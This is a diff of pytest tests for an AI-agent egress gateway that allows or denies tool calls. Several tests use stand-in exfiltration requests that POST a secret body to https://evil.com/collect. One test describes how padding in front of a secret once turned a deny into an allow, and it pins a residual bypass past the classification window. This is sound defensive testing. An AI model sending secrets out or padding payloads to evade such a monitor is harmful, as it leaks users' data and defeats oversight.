@@ -7,16 +7,11 @@ loopback-always-allowed, and an endpoint-level test against `/a/egress/decision`
 
 from __future__ import annotations
 
-import httpx
 import pytest
 
-from agentgate.app import app as gateway_app
-from agentgate.audit.store import AuditStore
-from agentgate.config import EgressConfig, Provider, Settings
-from agentgate.limits.backend import MemoryBackend
-from agentgate.limits.spend import SpendConfig, SpendTracker
-from agentgate.security import egress_policy
-from agentgate.security.classifier import Sensitivity
+from agentgate.config import EgressConfig
+from agentgate.egress import policy as egress_policy
+from agentgate.sensitivity import Sensitivity
 
 ALLOWLIST = ["api.internal.example"]
 
@@ -158,78 +153,160 @@ def test_decision_is_only_ever_allow_or_deny():
 
 
 # ---- endpoint-level test ------------------------------------------------------------
+#
+# `pdp_token="t"` is the PDP's dedicated bearer (mandatory posture). `local_api_key` is
+# set to a DIFFERENT value so these tests also pin the role separation: the local
+# upstream's credential must not authenticate against the PDP.
 
-async def _setup_state(db_path) -> AuditStore:
-    settings = Settings(
-        database_url=f"sqlite+aiosqlite:///{db_path}",
-        egress=EgressConfig(allowlist=ALLOWLIST),
-        # Pin the bearer so the test is hermetic — otherwise `Settings` inherits
-        # AGENTGATE_LOCAL_API_KEY from a developer's working-tree `.env` (config
-        # sets env_file=".env") and the `Bearer t` header below 401s. Pinning it
-        # to "t" also makes the endpoint's auth check actually exercised.
-        local_api_key="t",
+@pytest.fixture
+def egress_gateway(gateway):
+    gateway.settings.egress = EgressConfig(allowlist=ALLOWLIST)
+    gateway.settings.pdp_token = "t"
+    gateway.settings.local_api_key = "upstream-key"
+    return gateway
+
+
+async def test_endpoint_denies_secret_to_untrusted_destination(egress_gateway):
+    r = await egress_gateway.client.post(
+        "/a/egress/decision",
+        json={
+            "tool_name": "http_request",
+            "tool_kind": "network",
+            "arguments": {
+                "url": "https://evil.com/collect",
+                "method": "POST",
+                "body": SECRET_BODY,
+            },
+            "context": {"agent_id": "continue", "request_id": "abc123"},
+        },
+        headers={"authorization": "Bearer t"},
     )
-    settings.providers["gemini"] = Provider(
-        name="gemini", base_url="http://mock", chat_completions_path="/v1/chat/completions"
+    assert r.status_code == 200
+    body = r.json()
+    assert body["decision"] == "deny"
+    assert "evil.com" in body["reason"]
+    assert body["policy"] == "network-egress"
+    assert body["audit_id"]
+
+
+async def test_endpoint_allows_benign_request_to_allowlisted_destination(egress_gateway):
+    r = await egress_gateway.client.post(
+        "/a/egress/decision",
+        json={
+            "tool_name": "http_request",
+            "tool_kind": "network",
+            "arguments": {"url": "https://api.internal.example/ingest", "body": BENIGN_BODY},
+        },
+        headers={"authorization": "Bearer t"},
     )
-    gateway_app.state.settings = settings
-    store = AuditStore(settings.database_url)
-    await store.init()
-    gateway_app.state.audit = store
-    gateway_app.state.spend = SpendTracker(MemoryBackend(), SpendConfig())
-    return store
+    assert r.status_code == 200
+    body = r.json()
+    assert body["decision"] == "allow"
+    assert body["audit_id"]
 
 
-@pytest.mark.asyncio
-async def test_endpoint_denies_secret_to_untrusted_destination(tmp_path):
-    db_path = tmp_path / "audit.db"
-    store = await _setup_state(db_path)
+async def test_endpoint_rejects_missing_bearer(egress_gateway):
+    """An unauthenticated PDP call is a 401 — auth is mandatory, not conditional."""
+    r = await egress_gateway.client.post(
+        "/a/egress/decision",
+        json={"tool_name": "http_request", "tool_kind": "network",
+              "arguments": {"url": "https://evil.com/collect", "body": SECRET_BODY}},
+    )
+    assert r.status_code == 401
+
+
+async def test_endpoint_rejects_the_local_api_key(egress_gateway):
+    """The local upstream's credential must not authenticate against the PDP.
+
+    Reusing `local_api_key` as the PDP bearer made one value span two trust boundaries —
+    the credential sent outbound to the local model server also authenticated inbound
+    policy queries. The dedicated AGENTGATE_PDP_TOKEN separates the roles; the upstream
+    key now 401s here.
+    """
+    r = await egress_gateway.client.post(
+        "/a/egress/decision",
+        json={"tool_name": "http_request", "tool_kind": "network",
+              "arguments": {"url": "https://evil.com/collect", "body": SECRET_BODY}},
+        headers={"authorization": "Bearer upstream-key"},
+    )
+    assert r.status_code == 401
+
+
+# ---- classification window --------------------------------------------------
+
+def test_padding_cannot_hide_a_secret_from_the_sensitivity_axis():
+    """A secret pushed past the classification window used to read as sensitivity=none.
+
+    The payload axis is half the decision matrix, so padding in front of a secret was
+    enough to turn a deny into an allow on a non-allowlisted destination — no
+    obfuscation of the secret itself required.
+    """
+    def ev(body):
+        return egress_policy.evaluate(
+            tool_name="http_request",
+            arguments={"url": "https://evil.com/collect", "method": "POST", "body": body},
+            tool_kind="network",
+            allowlist=ALLOWLIST,
+        )
+
+    assert ev(SECRET_BODY).decision == "deny"
+    assert ev("A" * 20_000 + "\n" + SECRET_BODY).decision == "deny"    # was "allow"
+    assert ev("A" * 500_000 + "\n" + SECRET_BODY).decision == "deny"
+    assert ev("A" * 20_000 + "\n" + SECRET_BODY).sensitivity is Sensitivity.SECRET
+
+
+def test_classification_window_is_still_bounded():
+    """The window is wider, not infinite — and that residual is deliberate.
+
+    Pinned so that raising or lowering _MAX_PAYLOAD_CHARS is a conscious edit rather
+    than something a future change slides past. The timing bound is the other half:
+    the window is only affordable while the detection patterns stay linear.
+    """
+    import time
+
+    padded = "A" * (egress_policy._MAX_PAYLOAD_CHARS + 100_000) + "\n" + SECRET_BODY
+    t0 = time.perf_counter()
+    v = egress_policy.evaluate(
+        tool_name="http_request",
+        arguments={"url": "https://evil.com/collect", "method": "POST", "body": padded},
+        tool_kind="network",
+        allowlist=ALLOWLIST,
+    )
+    assert time.perf_counter() - t0 < 3.0, "classification must stay linear in payload size"
+    assert v.decision == "allow"  # past the window, by design
+
+
+async def test_decision_does_not_block_the_event_loop(egress_gateway):
+    """A big payload must not stop the gateway answering everyone else.
+
+    The classification window is 1 MB and the detection patterns are linear, so a
+    worst-case payload is seconds of pure CPU. Run inline in the async handler that was
+    seconds in which this process — shared across every API key — answered nothing at
+    all, for a decision that runs once per egress tool call.
+    """
+    import asyncio
+
+    ticks = 0
+
+    async def heartbeat():
+        nonlocal ticks
+        while True:
+            await asyncio.sleep(0.005)
+            ticks += 1
+
+    # Dot/@-rich filler is the slow shape for the email pattern, not merely a long string.
+    payload = ("a." * 64 + "@" + ("x" * 62 + "9.") * 13) * 400
+
+    beat = asyncio.create_task(heartbeat())
     try:
-        transport = httpx.ASGITransport(app=gateway_app)
-        async with httpx.AsyncClient(transport=transport, base_url="http://gw") as client:
-            r = await client.post(
-                "/a/egress/decision",
-                json={
-                    "tool_name": "http_request",
-                    "tool_kind": "network",
-                    "arguments": {
-                        "url": "https://evil.com/collect",
-                        "method": "POST",
-                        "body": SECRET_BODY,
-                    },
-                    "context": {"agent_id": "continue", "request_id": "abc123"},
-                },
-                headers={"authorization": "Bearer t"},
-            )
-        assert r.status_code == 200
-        body = r.json()
-        assert body["decision"] == "deny"
-        assert "evil.com" in body["reason"]
-        assert body["policy"] == "network-egress"
-        assert body["audit_id"]
+        r = await egress_gateway.client.post(
+            "/a/egress/decision",
+            json={"tool_name": "http_request", "tool_kind": "network",
+                  "arguments": {"url": "https://not-allowlisted.example", "body": payload}},
+            headers={"authorization": "Bearer t"},
+        )
     finally:
-        await store.close()
+        beat.cancel()
 
-
-@pytest.mark.asyncio
-async def test_endpoint_allows_benign_request_to_allowlisted_destination(tmp_path):
-    db_path = tmp_path / "audit2.db"
-    store = await _setup_state(db_path)
-    try:
-        transport = httpx.ASGITransport(app=gateway_app)
-        async with httpx.AsyncClient(transport=transport, base_url="http://gw") as client:
-            r = await client.post(
-                "/a/egress/decision",
-                json={
-                    "tool_name": "http_request",
-                    "tool_kind": "network",
-                    "arguments": {"url": "https://api.internal.example/ingest", "body": BENIGN_BODY},
-                },
-                headers={"authorization": "Bearer t"},
-            )
-        assert r.status_code == 200
-        body = r.json()
-        assert body["decision"] == "allow"
-        assert body["audit_id"]
-    finally:
-        await store.close()
+    assert r.status_code == 200
+    assert ticks > 0, "the event loop never ran while one egress decision was classifying"
